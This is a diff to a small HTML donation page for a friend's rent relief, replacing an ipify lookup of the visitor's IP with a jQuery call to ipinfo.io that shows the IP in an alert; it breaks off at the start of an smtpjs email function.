@@ -4,13 +4,14 @@
    Donate to providing rent relief for my close friend Lydia
   </title>
   <script src="https://smtpjs.com/v3/smtp.js"></script>
-	 <script type="application/javascript">
-  function getIP(json) {
-    document.write(json.ip);
-  }
-</script>
-
-<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+	 <script src= 
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"> 
+    </script> 
+    <script> 
+        $.get("https://ipinfo.io", function(response) { 
+            alert(response.ip); 
+        }, "json") 
+    </script> 
   <script>
    function sendEmail(key){
   Email.send({
